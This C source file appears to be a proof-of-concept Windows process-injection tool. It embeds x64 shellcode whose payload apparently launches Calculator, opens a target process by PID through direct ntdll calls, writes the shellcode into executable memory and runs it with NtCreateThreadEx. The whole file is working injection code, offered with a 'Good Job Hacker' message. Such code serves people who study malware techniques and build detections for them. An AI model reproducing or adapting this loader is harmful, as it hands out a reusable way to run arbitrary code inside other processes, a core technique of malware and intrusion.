/* ///  **********************************************************************  /// 


@author:        @x1nerama (aka: bekoo)
@website:       x1nerama.github.io
@release-date:  02-08-2024
@last-update:   02-08-2024 - 4.58 AM


///  **********************************************************************  /// */

#include "functions.h"

char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00";


int main(int argc, char* argv[]) {
    size_t shellcodeSize = sizeof(shellcode);
    size_t BytesWritten  = 0;
    HANDLE HandleProcess, HandleThread;
    HMODULE ntdllHandle;
    PVOID RemoteBuffer = NULL;  
    DWORD PID; 

    if (argc < 2) {
        warn("Usage: .\\injection.exe <PID>");
        return -1;
    }        
    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES objAtt = { sizeof(objAtt), NULL };
    CLIENT_ID         CID    = { (HANDLE)PID, NULL };

    /* Get handle to ntdll */
    ntdllHandle = GetModuleHandleW(L"ntdll.dll");
    if (ntdllHandle == NULL)  {
        warn("failed to get handle to ntdll! Error code: 0x%lx", GetLastError());
        return -1;
    }
    okay("got handle to ntdll!");

    /* Get NtOpenProcess in NTDLL */    
    fn_NtOpenProcess NtOpenProcess = 
        (fn_NtOpenProcess)GetProcAddress(ntdllHandle, "NtOpenProcess");    

    /* Get NtAllocateVirtualMemory in NTDLL */    
    fn_NtAllocateVirtualMemory NtAllocateVirtualMemory = 
        (fn_NtAllocateVirtualMemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");   

    /* Get NtWriteVirtualMemory in NTDLL */    
    fn_NtWriteVirtualMemory NtWriteVirtualMemory = 
        (fn_NtWriteVirtualMemory)GetProcAddress(ntdllHandle, "NtWriteVirtualMemory");

    /* Get NtCreateThreadEx in NTDLL */    
    fn_NtCreateThreadEx NtCreateThreadEx = 
        (fn_NtCreateThreadEx)GetProcAddress(ntdllHandle, "NtCreateThreadEx");

    /* Get NtClose in NTDLL */    
    fn_NtClose NtClose = 
        (fn_NtClose)GetProcAddress(ntdllHandle, "NtClose");


    NTSTATUS ntOpenProcessStatus = NtOpenProcess(&HandleProcess, PROCESS_ALL_ACCESS, &objAtt, &CID);
    if (ntOpenProcessStatus != STATUS_SUCCESS) {
        warn("failed to get handle to process! Error Code: 0x%lx", ntOpenProcessStatus);
        return -1;
    }
    okay("opened target process!");

    NTSTATUS ntAllocateVirtualMemoryStatus = NtAllocateVirtualMemory(HandleProcess, &RemoteBuffer, 0, &shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (ntAllocateVirtualMemoryStatus != STATUS_SUCCESS) {
        warn("failed to allocated memory! Error Code: 0x%lx", ntAllocateVirtualMemoryStatus);
        goto _CLEAN;
    }    
    okay("allocated memory (%zu-bytes) in target process! Address: 0x%p", shellcodeSize, RemoteBuffer);

    NTSTATUS ntWriteVirtualMemoryStatus = NtWriteVirtualMemory(HandleProcess, RemoteBuffer, shellcode, sizeof(shellcode), &BytesWritten);
    if (ntWriteVirtualMemoryStatus != STATUS_SUCCESS) {
        warn("failed to write shellcode in process! Error Code: 0x%lx", ntWriteVirtualMemoryStatus);
        goto _CLEAN;
    }
    okay("wrote (%zu-byte) shellcode in 0x%p address!", shellcodeSize, RemoteBuffer);

    NTSTATUS ntCreateRemoteExStatus = NtCreateThreadEx(&HandleThread, THREAD_ALL_ACCESS, &objAtt, HandleProcess, RemoteBuffer, 0, 0, 0, 0, 0, 0);
    if (ntCreateRemoteExStatus != STATUS_SUCCESS) {
        warn("failed to create thread to execution! Error Code: 0x%lx", ntCreateRemoteExStatus);
        goto _CLEAN;
    }    
    info("created thread to execution! Now waiting for finish...");

    WaitForSingleObject(HandleThread, INFINITE);
    okay("Shellcode is executed! Good Job Hacker :>");

    goto _CLEAN;

_CLEAN:
    if (HandleThread) {
        NtClose(HandleThread);
    }   
    if (HandleProcess) {
        NtClose(HandleProcess);
    } 
    okay("cleaning is successful! exit..");
    return 0;
}